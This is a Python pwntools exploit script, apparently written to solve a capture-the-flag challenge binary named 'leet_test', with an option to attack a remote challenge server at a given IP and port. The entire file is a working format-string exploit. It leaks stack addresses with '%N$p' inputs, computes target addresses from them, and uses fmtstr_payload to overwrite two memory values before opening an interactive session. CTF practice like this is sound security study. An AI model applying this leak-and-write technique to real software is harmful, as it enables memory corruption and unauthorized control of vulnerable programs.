from pwn import *

# b *main+233
gs = '''
continue
'''

elf = context.binary = ELF("./leet_test")

def start():
    if args.REMOTE:
        return remote("83.136.254.158", 48817)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def leak_address(i):
    io.sendlineafter("Please enter your name: ", f"%{i}$p".encode())
    io.recvuntil(b"Hello, ")
    return io.recvline().decode().strip()

context.terminal = ['gnome-terminal', '-e']
io = start()

random_content_address = int(leak_address(16), 16) - 268
winner_content_address = int(leak_address(49), 16) + 0x2dae

info(f"Leak random content Address: {hex(random_content_address)}")
info(f"Winner content Address: {hex(winner_content_address)}")

writes_dict = {
    random_content_address: 0x0,
    winner_content_address: 0x0
}

payload = fmtstr_payload(10, writes_dict, write_size="short")

io.sendlineafter("Please enter your name: ", payload)

io.interactive()